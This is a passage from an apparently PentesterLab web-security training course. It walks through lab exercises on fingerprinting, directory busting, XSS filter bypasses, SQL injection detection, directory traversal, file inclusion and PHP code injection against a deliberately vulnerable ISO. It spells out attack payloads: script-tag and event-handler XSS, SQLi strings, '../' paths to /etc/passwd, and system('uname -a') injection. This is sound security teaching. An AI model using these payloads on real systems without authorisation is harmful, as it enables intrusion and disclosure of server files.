Someone can obviously write a Java application with `.php` extensions or a PHP application with `.do` extensions but it's really unlikely.
</div>

<p>It's also possible to fingerprint the website by looking at the way the actions are mapped to URLs. For example, in Ruby-On-Rails, developers can use scaffolding to automatically generate code to manage the views (HTML code), the model (storage logic) and the controller (business logic) for a given object. This will generate a URL mapping in which:</p>

<ul>
<li><code>/objects/</code> will give you a list of all the objects;</li>
<li><code>/objects/new</code> will give you the page to create a new object;</li>
<li><code>/objects/12</code> will give you the object with the id 12;</li>
<li><code>/objects/12/edit</code> will give you the page to modify the object with the id 12;</li>
<li>...</li>
</ul>

<h2>Check for favicon.ico</h2>

<p>The favicon.ico is this little picture you can find in your browser URL bar when you visit a web site: </p>

<p><img src="./wfp_course_files/favicon.png" alt="favicon.ico"></p>

<p>This picture can be used as a fingerprinting element since most developers or system administrators don't change it and most applications or servers provide their own. For example, the favicon below is used by Drupal.</p>

<p><img src="./wfp_course_files/drupal-favicon.png" alt="favicon.ico drupal"></p>

<h2>Check the robots.txt file</h2>

<p>Another common file deployed with applications is the <code>robots.txt</code>. Some PHP-based applications make heavy use of <code>robots.txt</code>, to prevent search engines from indexing some parts of the application. They are a really good source of information, and can be used to map interesting parts of the application and to find out what framework or application is used to build the website.</p>

<p>For example, the following <code>robots.txt</code> is used by the CMS Joomla:</p>

<pre># If the Joomla site is installed within a folder such as at
# e.g. www.example.com/joomla/ the robots.txt file MUST be
# moved to the site root at e.g. www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to the disallowed
# path, e.g. the Disallow rule for the /administrator/ folder
# MUST be changed to read Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /images/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /libraries/
Disallow: /logs/
Disallow: /media/
Disallow: /modules/
Disallow: /plugins/
Disallow: /templates/
Disallow: /tmp/
</pre>

<p>It also tells you what you should check. If a website does not want something to be indexed it's probably because it's interesting security-wise.</p>

<h2>Searching for directories and pages</h2>

<p>After browsing the website, it's important to search for pages or directories that are not directly available through a link. To achieve that, you need to use a list of file names and check if these names exist on the remote server.</p>

<h3>Directory/Pages busting</h3>

<p>The tool Wfuzz (<a href="http://www.edge-security.com/wfuzz.php">http://www.edge-security.com/wfuzz.php</a>) can be used to detect directories and pages on the web server using wordlists of common resource names.</p>

<p>The following command can be run to detect remote files and directories:</p>

<pre>$ python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404 http://vulnerable/FUZZ
</pre>

<p>You can do a lot with Wfuzz:</p>

<ul>
<li>Filter based on the error code.</li>
<li>Only search for files with a given extension: <code>http://vulnerable/FUZZ.php</code>.</li>
<li>Brute force credentials. </li>
<li>...</li>
</ul>

<p>As with any other tool, the best way to learn is to play with it and see what you can do. </p>

<h3>Finding administration pages</h3>

<p>Most administration pages are well known URLs, and can be found using a directory buster. However it's always really handy to keep a list of administration pages per technology/server. You can also check the product/project documentation to get this information. </p>

<div class="protip">
Among your list of administration pages, keep information about default credentials that work with them.
</div>

<h2>Generating errors</h2>

<p>Generating 404 errors can give you a lot of information about the backend hosting the web application. In order to generate the error, you just have to put a random string in the URL you request, for example <code>randomlongstring</code>.</p>

<p>The server's configuration can obviously change this behaviour, but this is the page you will get, containing a 404 error, if the server is Tomcat:</p>

<p><img src="./wfp_course_files/tomcat404.png" alt="Tomcat 404"></p>

<p>And the same thing for Ruby-on-Rails:</p>

<p><img src="./wfp_course_files/rails404.png" alt="Rails 404"></p>

<p>There are lots of different ways to generate errors in a web application. For example, by adding some special characters, like a NULL byte (%00), a single quote (%27) or a double quote (%22) you are likely to generate errors. You can also remove a value from the HTTP request. Once you manage to get the error page, you can understand more about what you are attacking (example for Tomcat):</p>

<p><img src="./wfp_course_files/tomcat500.png" alt="Tomcat 500"></p>

<p>Anything that can modify the application's behaviour and generate errors is a good way to retrieve information. An easy test with a PHP applications is to replace <code>/index.php?name=hacker</code> with <code>/index.php?name[]=hacker</code>.</p>

<p><img src="./wfp_course_files/php-error.png" alt="php error"></p>

<p>One of the key things is to be able to <strong>read</strong> errors. It sounds silly, but you would be surprised by how many people think that two errors are the same, even if the error messages are different: <em>"The devil is in the details"</em>.</p>

<h2>Keep information</h2>

<p>Any information should be kept, everything should be saved:</p>

<ul>
<li>A path on the remote server.</li>
<li>An error message.</li>
<li>The database backend used.</li>
<li>An internal IP address disclosed in the headers.</li>
<li><em>Everything</em>, ...</li>
</ul>

<p>Keeping information will often help you exploit another vulnerability. For example, if you need to know where the application is stored on the server, you may already have this information, thanks to an error message from another part of the application.</p>

<h1>Building useful tools</h1>

<p>Being able to have some simple scripts to send HTTP requests can be really handy. I would recommend that you build at least the following: </p>

<ul>
<li>An HTTP client using a traditional HTTP library (like Ruby's net/http) and one using sockets only that allows you to send basic GET and POST requests.</li>
<li>An HTTP client that supports SSL (both with HTTP library and with socket only).</li>
<li>An HTTP client that supports cookies (both with HTTP library and with socket only).</li>
</ul>

<div class="homework">
Once you have all of these working, you can then build a tool that supports all of these together.
</div>

<p>Once you have all of this ready to go, it is really easy to build your own tool to exploit a vulnerability or to automate some part of the discovery process during a test. Complex bugs often need a bit of automation. You are unlikely to be able to exploit them, unless you can write your own HTTP clients.</p>

<h1>Examples of Web vulnerabilities</h1>

<p>This section puts together a few practical exercises on common web vulnerabilities. If you are already familiar with web testing, don't read further and just try and see how you do. Then you can come back, to see what other methods can be used, and what was expected. </p>

<p>To test for web vulnerabilities, I mainly mix two methods:</p>

<ul>
<li>Trying to work out what the code on the server side looks like.</li>
<li>Trying to send different values that should give you the same results if the page is vulnerable.</li>
</ul>

<p>I will provide some examples of these methods for the examples in the ISO.</p>

<p>In this exercise, the error messages are echoed back in most pages. However in real life, error messages should be (and often are) turned off. The methods used here to detect each vulnerability work for both cases.</p>

<p>You also need to remember that penetration testing is a guessing game. You will sometimes need to guess a path, or try hundreds of values. You may try your usual detection methods, only to find that a third of them work. You will then need to come up with new assertions, to work out if a particular page is vulnerable.</p>

<p>Most web issues rely on the same problem: being able to break the syntax: </p>

<ul>
<li>Breaking the syntax of an SQL statement, in order to leverage an SQL injection vulnerability.</li>
<li>Breaking the syntax of a HTML page, in order to leverage a Cross-Site Scripting vulnerability.</li>
<li>...</li>
</ul>

<p>For example, if you have the following pattern:</p>

<pre>[CODE][SEPARATOR][USER INPUT][SEPARATOR][CODE]
</pre> 

<p>Your goal is to use <code>[USER INPUT]</code> to inject <code>[CODE]</code> and to do that, you will need to inject a <code>[SEPARATOR]</code> as part of the <code>[USER INPUT]</code>. Sometimes there is no need of a separator. In most cases, the separator is one of these characters: <code>'</code>, <code>"</code>, `. Injecting them (one after another) and observing the responses you get back will often give you an indication of the presence of anything suspect.</p>

<h2>Cross-Site Scripting (XSS)</h2>

<p>Cross-Site Scripting stems from a lack of encoding when information gets sent to application's users. This can be used to inject arbitrary HTML and JavaScript; the result being that this payload runs in the web browser of legitimate users. As opposed to other attacks, XSS vulnerabilities target an application's users, instead of directly targeting the server. </p>

<p>Some examples of exploitation include: </p>

<ul>
<li>injecting a fake login form;</li>
<li>retrieving legitimate users' cookies;</li>
<li>injecting browser's exploits;</li>
<li>getting users to perform an arbitrary action in the web application;</li>
<li>...</li>
</ul>

<p>In this section, we will only focus on the detection of Cross-Site Scripting. You will have to wait for a full exercise on this subject to get more details on how to exploit these vulnerabilities.</p>

<p>The easiest, and most common proof that a XSS vulnerability exists is to get an alert box to pop up. This payload has many advantages:</p>

<ul>
<li>it shows that JavaScript can be triggered;</li>
<li>it's simple;</li>
<li>it's harmless.</li>
</ul>

<p>To trigger a pop-up, you can simply use the following payload: <code>alert(1)</code>.</p>

<p>If you are injecting inside HTML code, you will need to tell the browser that this is JavaScript code. You can use the <code>&lt;script&gt;</code> tag to do that: <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>.</p>

<p>When testing for XSS, there are two important things to remember:</p>

<ul>
<li>The response you get back from the server is probably not the only place this information will be echoed back. If you inject a payload and you get it back correctly encoded in page A, it doesn't mean that this information will be correctly encoded in page B. </li>
<li>If you find a problem with encoding, but can't get your XSS payload to run, someone else may be able to. It's always important to report an encoding problem, even if some protection prevents you from getting your payload from executing. Security is an evolving domain, with new tricks published every week. Even if you cannot exploit a XSS vulnerability now, you or someone else may be able to get another payload to work later on. </li>
</ul>

<p>There are three types of XSS:</p>

<ul>
<li>Reflected: the payload is directly echoed back in the response.</li>
<li>Stored: the payload can be echoed back directly in the response but will more importantly be echoed back in the response when you come back to this page or to another page. The payload is stored in the backend of the application.</li>
<li>DOM-based: the payload is not echoed back in the page. It gets executed dynamically when the browser renders the page.</li>
</ul>

<p>When testing for XSS, you need to read the source of the HTML page sent back, you cannot just wait for the alert box to pop up. Check what characters get encoded and what characters don't get encoded. From this, you may find a payload that works.</p>

<p>Some browsers provide built-in protection against XSS. This protection can be enabled or disabled by the server (it has been disabled in the ISO). If you find that your payload is directly echoed back in the page but no alert box pops up, it's probably because of this protection. You can also disable this protection by telling your browser to disable it. For example, in Chrome, it can be done by running Chrome with the option <code>--disable-xss-auditor</code>.</p>

<h3>Example 1</h3>

<p>The first vulnerable example is just here to get you started with what is going on when you find a XSS. Using the basic payload, you should be able to get an alert box.</p>

<p>Once you send your payload, you should get something like: </p>

<p><img src="./wfp_course_files/xss-alert.png" alt="XSS alert"></p>

<p>Make sure that you check the source code of the HTML page to see that the information you sent as part of the request is echoed back without any HTML encoding. </p>

<h3>Example 2</h3>

<p>In the second example, a bit of filtering is involved. The web developer added some regular expressions, to prevent the simple XSS payload from working. </p>

<p>If you play around, you can see that <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code> are filtered. One of the most basic ways to bypass these types of filters is to play with the case: if you try <code>&lt;sCript&gt;</code> and <code>&lt;/sCRIpt</code> for example, you should be able to get the alert box. </p>

<h3>Example 3</h3>

<p>You notified the developer about your bypass. He has added more filtering, wich now seems to prevent your previous payload. However, he is making a terrible mistake in his code (which was also present in the previous code)...</p>

<p>If you keep playing around, you will realise that if you use <code>Pentest&lt;script&gt;erLab</code> for payload, you can see <code>PentesterLab</code> in the page. You can probably use that to get <code>&lt;script&gt;</code> in the page, and your alert box to pop up.</p>

<h3>Example 4</h3>

<p>In this example, the developer decided to completely blacklist the word <code>script</code>: if the request matches <code>script</code>, the execution stops.</p>

<p>Fortunately (or unfortunately depending on what side you are on), there are a lot of ways to get JavaScript to be run (non-exhaustive list): </p>

<ul>
<li>with the <code>&lt;a</code> tag and for the following events: <code>onmouseover</code> (you will need to pass your mouse over the link), <code>onmouseout</code>, <code>onmousemove</code>, <code>onclick</code> ...</li>
<li>with the <code>&lt;a</code> tag directly in the URL: <code>&lt;a href='javascript:alert(1)'...</code> (you will need to click the link to trigger the JavaScript code and remember that this won't work since you cannot use <code>script</code> in this example).</li>
<li>with the <code>&lt;img</code> tag directly with the event <code>onerror</code>: <code>&lt;img src='zzzz' onerror='alert(1)' /&gt;</code>.</li>
<li>with the <code>&lt;div</code> tag and for the following events: <code>onmouseover</code> (you will need to pass your mouse over the link), <code>onmouseout</code>, <code>onmousemove</code>, <code>onclick</code>...</li>
<li>...</li>
</ul>

<p>You can use any of these techniques to get the alert box to pop-up.</p>

<h3>Example 5</h3>

<p>In this example, the <code>&lt;script&gt;</code> tag is accepted and gets echoed back. But as soon as you try to inject a call to alert, the PHP script stops its execution. The problem seems to come from a filter on the word <code>alert</code>.</p>

<p>Using JavaScript's <code>eval</code> and <code>String.fromCharCode()</code>, you should be able to get an alert box without using the word <code>alert</code> directly. String.fromCharCode() will decode an integer (decimal value) to the corresponding character.</p>

<div class="homework"> 
You can write a small tool to transform your payload to this format using your favorite scripting language.
</div>

<p>Using this trick and the ascii table, you can easily generate the string: <code>alert(1)</code> and call eval on it. </p>

<p>Another easier bypass is to use the functions <code>prompt</code> or <code>confirm</code> in Javascript. They are less-known, but will give you the same result.</p>

<h3>Example 6</h3>

<p>Here, the source code of the HTML page is a bit different. If you read it, you will see that the value you are sending is echoed back inside JavaScript code. To get your alert box, you will not need to inject a script tag, you will just need to correctly complete the pre-existing JavaScript code and add your own payload, then you will need to get rid of the code after your injection point by commenting it out (using <code>//</code>) or by adding some dummy code (<code>var $dummy = "</code>) to close it correctly.</p>

<h3>Example 7</h3>

<p>This example is similar to the one before. This time, you won't be able to use special characters, since they will be HTML-encoded. As you will see, you don't really need any of these characters. </p>

<p>This issue is common in PHP web applications, because the well-known function used to HTML-encode characters (<code>htmlentities</code>) does not encode single quotes (<code>'</code>), unless you told it to do so, using the <code>ENT_QUOTES</code> flag. </p>

<h3>Example 8</h3>

<p>Here, the value echoed back in the page is correctly encoded. However, there is still a XSS vulnerability in this page. To build the form, the developer used and trusted <code>PHP_SELF</code> which is the path provided by the user. It's possible to manipulate the path of the application in order to:</p>

<ul>
<li>call the current page (however you will get an HTTP 404 page);</li>
<li>get a XSS payload in the page.</li>
</ul>

<p>This can be done because the current configuration of the server will call <code>/xss/example8.php</code> when any URL matching <code>/xss/example8.php/...</code> is accessed. You can simply get your payload inside the page by accessing <code>/xss/example8.php/[XSS_PAYLOAD]</code>. Now that you know where to inject your payload, you will need to adapt it to get it to work and get the famous alert box. </p>

<p>Trusting the path provided by users is a common mistake, and it can often be used to trigger XSS, as well as other issues. This is pretty common in pages with forms, and in error pages (404 and 500 pages).</p>

<h3>Example 9</h3>

<p>This example is a DOM-based XSS. This page could actually be completely static and still be vulnerable.</p>

<p>In this example, you will need to read the code of the page to understand what is happening. When the page is rendered, the JavaScript code uses the current URL to retrieve the anchor portion of the URL (<code>#...</code>) and dynamically (on the client side) write it inside the page. This can be used to trigger a XSS vulnerability, if you use the payload as part of the URL.</p>

<h2>SQL injections</h2>

<p>SQL injections are one of the most common (web) vulnerabilities. All SQL injections exercises, found here, use MySQL for back-end. SQL injections come from a lack of encoding/escaping of user-controlled input when included in SQL queries.</p>

<p>Depending on how the information gets added in the query, you will need different things to break the syntax. There are three different ways to echo information in a SQL statement:</p>

<ul>
<li>Using quotes: single quote or double quote.</li>
<li>Using back-ticks.</li>
<li>Directly.</li>
</ul>

<p>For example, if you want to use information as a string you can do:</p>

<pre>SELECT * FROM user WHERE name="root";
</pre>

<p>or </p>

<pre>SELECT * FROM user WHERE name='root';
</pre>

<p>If you want to use information as an integer you can do:</p>

<pre>SELECT * FROM user WHERE id=1;
</pre>

<p>And finally, if you want to use information as a column name, you will need to do:</p>

<pre>SELECT * FROM user ORDER BY name;
</pre>

<p>or</p>

<pre>SELECT * FROM user ORDER BY `name`;
</pre>

<p>It's also possible to use an integer as string, but it will be slower:</p>

<pre>SELECT * FROM user WHERE id='1';
</pre>

<p>The way information is echoed back, and even what separator is used, will decide the detection technique to use. However, you don't have this information, and you will need to try to guess it. You will need to formulate hypotheses and try to verify them. That's why spending time poking around with the examples on the liveCD is so important.</p>

<h3>Example 1</h3>

<p>In this first example, we can see that the parameter is a string, and we can see one line in the table. To understand the server side code, we need to start poking around:</p>

<ul>
<li>If we add extra characters like "1234", using <code>?name=root1234</code>, no record is displayed in the table. From here, we can guess that the request uses our value in some kind of matching.</li>
<li>If we inject spaces in the request, using <code>?name=root+++</code> (after encoding), the record is displayed. MySQL (by default) will ignore trailing spaces in the string when performing the comparison.</li>
<li>If we inject a double quote, using <code>?name=root"</code>, no record is displayed in the table.</li>
<li>If we inject a single quote, using <code>?name=root'</code>, the table disappears. We probably broke something...</li>
</ul>

<p>From this first part, we can deduce that the request must look like:</p>

<pre>SELECT * FROM users WHERE name='[INPUT]';
</pre>

<p>Now, let's verify this hypothesis.</p>

<p>If we are right, the following injections should give the same results.</p>

<ul>
<li><code>?name=root' and '1'='1</code>: the quote in the initial query will close the one at the end of our injection. </li>
<li><code>?name=root' and '1'='1' #</code> (don't forget to encode <code>#</code>): the quote in the initial query will be commented out.</li>
<li><code>?name=root' and 1=1 #</code> (don't forget to encode <code>#</code>): the quote in the initial query will be commented out and we don't need the <code>'</code> in <code>'1'='1'</code>.</li>
<li><code>?name=root' #</code> (don't forget to encode <code>#</code>): the quote in the initial query will be commented out and we don't need the <code>1=1</code>.</li>
</ul>

<p>Now these requests may not return the same thing:</p>

<ul>
<li><code>?name=root' and '1'='0</code>: the quote in the initial query will close the one at the end of our injection. The page should not return any result (empty table), since the selection criteria always returns false.</li>
<li><code>?name=root' and '1'='1 #</code> (don't forget to encode <code>#</code>): the quote in the initial query will be commented out. We should have the same result as the query above.</li>
<li><code>?name=root' or '1'='1</code>: the quote in the initial query will close the one at the end of our injection. <code>or</code> will select all results, with the second part being always true. It may give the same result, but it's unlikely, since the value is used as a filter for this example (as opposed to a page only showing one result at a time).</li>
<li><code>?name=root' or '1'='1' #</code> (don't forget to encode <code>#</code>): the quote in the initial query will be commented out. We should have the same result as the query above.</li>
</ul>

<p>With all these tests, we can be sure that we have a SQL injection. This training only focuses on detection. You can look into other PentesterLab training, and learn how to exploit this type of issues.</p>

<h3>Example 2</h3>

<p>In this example, the error message gives away the protection created by the developer: <code>ERROR NO SPACE</code>. This error message appears as soon as a space is injected inside the request. It prevents us from using the <code>' and '1'='1</code> method, or any fingerprinting that uses the space character. However, this filtering is easily bypassed, using tabulation (HT or <code>\t</code>). You will need to use encoding, to use it inside the HTTP request. Using this simple bypass, you should be able to see how to detect this vulnerability.</p>

<h3>Example 3</h3>

<p>In this example, the developer blocks spaces and tabulations. There is a way to bypass this filter. You can use comments between the keywords to build a valid request without any space or tabulation. The following SQL comments can be used: <code>/**/</code>. By replacing all space/tabulation in the previous examples using this comment, you should be able to test for this vulnerability.</p>

<h3>Example 4</h3>

<p>This example represents a typical mis-understanding of how to protect against SQL injection. In the 3 previous examples, using the function <code>mysql_real_escape_string</code> would have prevented the vulnerability. In this example, the developer used the same logic. However, the value used is an integer and is not echoed between single quote <code>'</code>. Since the value is directly put in the query, using <code>mysql_real_escape_string</code> does not prevent anything. Here, you only need to be able to add spaces and SQL keywords to break the syntax. The detection method is really similar to the one used for string-based SQL injection. You just don't need the quote at the beginning of the payload.</p>

<p>Another method to detect this is to play with the integer. The initial request is <code>?id=2</code>. By playing with the value 2, we can detect the SQL injection:</p>

<ul>
<li><code>?id=2 #</code> (<code>#</code> needs to be encoded) should return the same thing.</li>
<li><code>?id=3-1</code> should return the same thing. The database will automatically perform the subtraction and you will get the same result.</li>
<li><code>?id=2-0</code> should return the same thing.</li>
<li><code>?id=1+1</code> (<code>+</code> needs to be encoded) should return the same thing. The database will automatically perform the addition and you will get the same result.</li>
<li><code>?id=2.0</code> should return the same thing.</li>
</ul>

<p>And the following should not return the same results:</p>

<ul>
<li><code>?id=2+1</code>.</li>
<li><code>?id=3-0</code>.</li>
</ul>

<h3>Example 5</h3>

<p>This example is really similar to the previous, detection-wise. If you look into the code, you will see that the developer tried to prevent SQL injection by using a regular expression:</p>

<pre>if (!preg_match('/^[0-9]+/', $_GET["id"])) {
    die("ERROR INTEGER REQUIRED");  
}
</pre>

<p>However, the regular expression used is incorrect; it only ensures that the parameter <code>id</code> <strong>starts</strong> with a digit. The detection method used previously can be used to detect this vulnerability.</p>

<h3>Example 6</h3>

<p>This example is the other way around. The developer made a mistake in the regular expression again:</p>

<pre>if (!preg_match('/[0-9]+$/', $_GET["id"])) {
    die("ERROR INTEGER REQUIRED");  
}
</pre>

<p>This regular expression only ensures that the parameter <code>id</code> <strong>ends</strong> with a digit (thanks to the <code>$</code> sign). It does not ensure that the beginning of the parameter is valid (missing <code>^</code>). You can use the methods learnt previously. You just need to add an integer at the end of your payload. This digit can be part of the payload or placed after a SQL comment: <code>1 or 1=1 # 123</code>.</p>

<h3>Example 7</h3>

<p>Another and last example of bad regular expression:</p>

<pre>if (!preg_match('/^-?[0-9]+$/m', $_GET["id"])) {
  die("ERROR INTEGER REQUIRED");    
}
</pre>

<p>Here we can see that the beginning (<code>^</code>) and end (<code>$</code>) of the string are correctly checked. However, the regular expression contains the modifier <code>PCRE_MULTILINE</code> (<code>/m</code>). The multiline modifier will only validate that one of the lines is only containing an integer, and the following values will therefore be valid (thanks to the new line in them):</p>

<ul>
<li><code>123\nPAYLOAD</code>;</li>
<li><code>PAYLOAD\n123</code>;</li>
<li><code>PAYLOAD\n123\nPAYLOAD</code>.</li>
</ul>

<p>These values need to be encoded when used in a URL, but with the use of encoding and the techniques seen previously you should be able to detect this vulnerability.</p>

<h3>Example 8</h3>

<p>In this example, the parameter name gives away where it will get echoed in the SQL query. If you look into MySQL documentation, there are two ways to provide a value inside an <code>ORDER BY</code> statement:</p>

<ul>
<li>directly: <code>ORDER BY name</code> ;</li>
<li>between back-ticks: <code>ORDER BY `name`</code>.</li>
</ul>

<p>The <code>ORDER BY</code> statement cannot be used with value inside single quote <code>'</code> or double quote <code>"</code>. If this is used, nothing will get sorted, since MySQL considers these as constants.</p>

<p>To detect this type of vulnerability, we can try to get the same result using different payloads:</p>

<ul>
<li><code>name` #</code> (<code>#</code> needs to be encoded) should give the same results.</li>
<li><code>name` ASC #</code> (<code>#</code> needs to be encoded) should give the same results.</li>
<li><code>name`, `name</code>: the back-tick in the initial query will close the one at the end of our injection. </li>
</ul>

<p>And the following payloads should give different results: </p>

<ul>
<li><code>name` DESC #</code> (<code>#</code> needs to be encoded).</li>
<li><code>name`</code> should not give any result, since the syntax is incorrect.</li>
</ul>

<h3>Example 9</h3>

<p>This example is similar to the previous one, but instead of back-tick ```</p>

<p>There are other methods that can be used in this case, since we are directly injecting in the request without a back-tick before. We can use the MySQL <code>IF</code> statement to generate more payloads:</p>

<ul>
<li><code>IF(1, name,age)</code> should give the same results.</li>
<li><code>IF(0, name,age)</code> should give different results. You can see that the columns are sorted by age, but the sort function compares the values as strings, not as integers (<code>10</code> is smaller than <code>2</code>). This is a side effect of <code>IF</code> that will sort values as strings if one of the column contains a string.</li>
</ul>

<h2>Directory traversal</h2>

<p>Directory traversals come from a lack of filtering/encoding of information used as part of a path by an application.</p>

<p>As with other vulnerabilities, you can use the "same value technique" to test for this type of issue. For example, if the path used by the application inside a parameter is <code>/images/photo.jpg</code>. You can try to access:</p>

<ul>
<li><code>/images/./photo.jpg</code>: you should see the same file.</li>
<li><code>/images/../photo.jpg</code>: you should get an error.</li>
<li><code>/images/../images/photo.jpg</code>: you should see the same file again.</li>
<li><code>/images/../IMAGES/photo.jpg</code>: you should get an error (depending on the file system) or something weird is going on.</li>
</ul>

<p>If you don't have the value <code>images</code> and the legitimate path looks like <code>photo.jpg</code>, you will need to work out what the parent repository is.</p>

<p>Once you have tested that, you can try to retrieve other files. On Linux/Unix the most common test case is the <code>/etc/passwd</code>. You can test: <code>images/../../../../../../../../../../../etc/passwd</code>, if you get the <code>passwd</code> file, the application is vulnerable. The good news is that you don't need to know the number of <code>../</code>. If you put too many, it will still work.</p>

<p>Another interesting thing to know is that if you have a directory traversal in Windows, you will be able to access <code>test/../../../file.txt</code>, even if the directory <code>test</code> does not exist. This is not the case, on Linux. This can be really useful where the code concatenates user-controlled data, to create a file name. For example, the following PHP code is supposed to add the parameter <code>id</code> to get a file name (<code>example_1.txt</code> for example). On Linux, you won't be able to exploit this vulnerability if there is no directory starting by <code>example_</code>, whereas on Windows, you will be able to exploit it, even if there is no such directory.</p>

<pre> $file = "/var/files/example_".$_GET['id'].".txt";</pre>

<p>In these exercises, the vulnerabilities are illustrated by a script used inside an <code>&lt;img</code> tag. You will need to read the HTML source (or use "Copy image URL") to find the correct link, and start exploiting the issue.</p>

<h3>Example 1</h3>

<p>The first example is a really simple directory traversal. You just need to go up in the file system, and then back down, to get any files you want. In this instance, you will be restricted by the file system permissions, and won't be able to access <code>/etc/shadow</code>, for example.</p>

<p>In this example, based on the header sent by the server, your browser will display the content of the response. Sometimes the server will send the response with a header <code>Content-Disposition: attachment</code>, and your browser will not display the file directly. You can open the file to see the content. This method will take you some time for every test. </p>

<p>Using a Linux/Unix system, you can do this more quickly, by using <code>wget</code>:</p>

<pre>% wget -O - 'http://vulnerable/dirtrav/example1.php?file=../../../../../../../etc/passwd'
[...]
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
[...]
</pre>

<h3>Example 2</h3>

<p>In this example, you can see that the full path is used to access the file. However, if you try to just replace it with <code>/etc/passwd</code>, you won't get anything. It looks like a simple check is performed by the PHP code. You can however bypass it by keeping the beginning of the path and add your payload at the end, to go up and back down within the file system.</p>

<h3>Example 3</h3>

<p>This example is based on a common problem when you exploit directory traversal: the server-side code adds its own suffix to your payload. This can be easily bypassed, by using a NULL BYTE (which you need to URL-encode as <code>%00</code>). Using NULL BYTE to get rid of any suffix added by the server-side code is a common bypass, and works really well in Perl and older versions of PHP.</p>

<div class="danger">
In this code, the issue is simulated since PHP solved this type of bypass since the version [5.3.4](http://php.net/releases/5_3_4.php). 
</div>

<h2>File include</h2>

<p>In a lot of applications, developers need to include files to load classes or to share some templates between multiple web pages.</p>

<p>File include vulnerabilities come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (<code>require</code>, <code>require_once</code>, <code>include</code> or <code>include_once</code> in PHP for example). If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own code. File include vulnerabilities can also be used as a directory traversal to read arbitrary files. However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.</p>

<p>This including function can allow the loading of local resources or remote resource (a website, for example). If vulnerable, it will lead to:</p>

<ul>
<li>Local File Include: LFI. A local file is read and interpreted.</li>
<li>Remote File Include: RFI. A remote file is retrieved and interpreted.</li>
</ul>

<p>By default, PHP disables loading of remote files, thanks to the configuration option: <code>allow_url_include</code>. In the ISO, it has been enabled to allow you to test it.</p>

<h3>Example 1</h3>

<p>In this first example, you can see an error message, as soon as you inject a special character (a quote, for example) into the parameter:</p>

<pre>Warning: include(intro.php'): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'intro.php'' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
</pre>

<p>If you read the error message carefully, you can extract a lot of information:</p>

<ul>
<li>The path of the script: <code>/var/www/fileincl/example1.php</code>.</li>
<li>The function used: <code>include()</code>.</li>
<li>The value used in the call to <code>include</code> is the value we injected <code>intro.php'</code> without any addition or filtering. </li>
</ul>

<p>We can use the methods used to detect directory traversal, to detect file include. For example, you can try to include <code>/etc/passwd</code> by using the <code>../</code> technique.</p>

<p>We can test for Remote File Include, by requesting an external resource: <a href="https://pentesterlab.com/">https://pentesterlab.com/</a>. We will see that the page from PentesterLab gets included inside the current page.</p>

<p>PentesterLab's website also contains a test for this type of vulnerability. If you use the URL <a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a>. You should get the result of the function <code>phpinfo()</code> within the current page:</p>

<p><img src="./wfp_course_files/rfi.png" alt="PHP include with phpinfo"></p>

<h3>Example 2</h3>

<p>In a similar manner to directory traversal, this example adds its own suffix to the value provided. As before, you can get rid of the suffix (for LFI) using a NULL BYTE. For RFI, you can get rid of the suffix, by adding <code>&amp;blah=</code> or <code>?blah=</code> depending on your URL.</p>

<p>In this exercise, the code simulates the behaviour of older versions of PHP. PHP now correctly handles paths and they cannot be poisoned using a NULL BYTE, as they used to.</p>

<div class="danger">
In this code, the issue is simulated, since PHP solved this type of bypass since the version (5.3.4)[http://php.net/releases/5_3_4.php]. 
</div>

<h2>Code injection</h2>

<p>In this section, we are going to work on code execution. Code executions come from a lack of filtering and/or escaping of user-controlled data. When you are exploiting a code injection, you will need to inject code within the information you are sending to the application. For example, if you want to run the command <code>ls</code>, you will need to send <code>system("ls")</code> to the application since it is a PHP application.</p>

<p>Just like other examples of web application issues, it's always handy to know how to comment out the rest of the code (i.e.: the suffix that the application will add to the user-controlled data). In PHP, you can use <code>//</code> to get rid of the code added by the application.</p>

<p>As with SQL injection, you can use the same value technique to test and ensure you have a code injection:</p>

<ul>
<li>By using comments and injecting <code>/* random value */</code>.</li>
<li>By injecting a simple concatenation <code>"."</code> (where <code>"</code> are used to break the syntax and reform it correctly).</li>
<li>By replacing the parameter you provided by a string concatenation, for example <code>"."ha"."cker"."</code> instead of <code>hacker</code>.</li>
</ul>

<p>You can also use time-based detection for this issue by using the PHP function <code>sleep</code>. You will see a time difference between:</p>

<ul>
<li>Not using the function <code>sleep</code> or calling it with a delay of zero: <code>sleep(0)</code>.</li>
<li>A call to the function with a long delay: <code>sleep(10)</code>. </li>
</ul>

<h3>Example 1</h3>

<p>This first example is a trivial code injection. If you inject a single quote, nothing happens. However, you can get a better idea of the problem by injecting a double quote: </p>

<pre>Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1
</pre>

<div class="protip">
This could be the other way around; the single quote could generate an error where the double quote may not.
</div>

<p>Based on the error message, we can see that the code is using the function <code>eval</code>: "Eval is evil...".</p>

<p>We saw that the double quote breaks the syntax, and that the function <code>eval</code> seems to be using our input. From this, we can try to work out payloads that will give us the same results:</p>

<ul>
<li><code>"."</code>: we are just adding a string concatenation; this should give us the same value.</li>
<li><code>"./*pentesterlab*/"</code>: we are just adding a string concatenation and information inside comments; this should give us the same value.</li>
</ul>

<p>Now that we have similar values working, we need to inject code. To show that we can execute code, we can try to run a command (for example <code>uname -a</code> using the code execution). The full PHP code looks like:</p>

<pre>system('uname -a');
</pre>

<p>The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:</p>

<ul>
<li>By adding dummy code: <code>".system('uname -a'); $dummy="</code>.</li>
